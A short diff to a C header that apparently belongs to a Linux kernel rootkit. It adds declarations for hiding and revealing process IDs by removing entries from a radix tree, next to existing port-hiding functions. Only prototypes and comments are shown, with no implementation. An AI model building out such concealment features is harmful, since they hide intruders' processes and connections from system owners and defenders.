@@ -12,6 +12,7 @@ struct struct_list {
         unsigned long num;
     };
     struct list_head list;
+    char data[0];
 };
 
 /**
@@ -51,3 +52,15 @@ void hide_port(unsigned int port);
  * show_port - Show the port hided by `hide_port`
  */
 void show_port(unsigned int port);
+
+
+/**
+ * hide_pid - Hide the pid by remove the element from radix tree
+ */
+void hide_pid(unsigned int tgid);
+
+
+/**
+ * show_pid - Show the pid hided by `hide_pid`
+ */
+void show_pid(unsigned int tgid);
